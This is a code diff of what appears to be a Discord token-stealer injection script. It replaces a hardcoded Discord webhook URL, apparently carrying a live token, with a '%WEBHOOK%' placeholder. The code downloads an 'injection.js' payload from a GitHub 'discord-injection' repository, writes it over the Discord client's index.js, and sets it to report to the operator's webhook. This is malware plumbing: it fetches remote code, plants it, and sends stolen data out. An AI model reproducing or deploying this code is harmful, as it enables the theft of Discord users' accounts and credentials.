@@ -11,7 +11,7 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "https://discord.com/api/webhooks/1378737741893996644/5BqbtOQDENZtl5_M0bysEL5rH8TsVW43lqF7xkApNUp7U6_W2Ow_onPwOvooEzeGuuPf",
+    webhook: "%WEBHOOK%",
     injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
     filters: {
         urls: [
@@ -522,7 +522,7 @@ async function initiation() {
   async function init() {
       https.get('${CONFIG.injection_url}', (res) => {
           const file = fs.createWriteStream(indexJs);
-          res.replace('https://discord.com/api/webhooks/1378737741893996644/5BqbtOQDENZtl5_M0bysEL5rH8TsVW43lqF7xkApNUp7U6_W2Ow_onPwOvooEzeGuuPf', '${CONFIG.webhook}')
+          res.replace('%WEBHOOK%', '${CONFIG.webhook}')
           res.pipe(file);
           file.on('finish', () => {
               file.close();
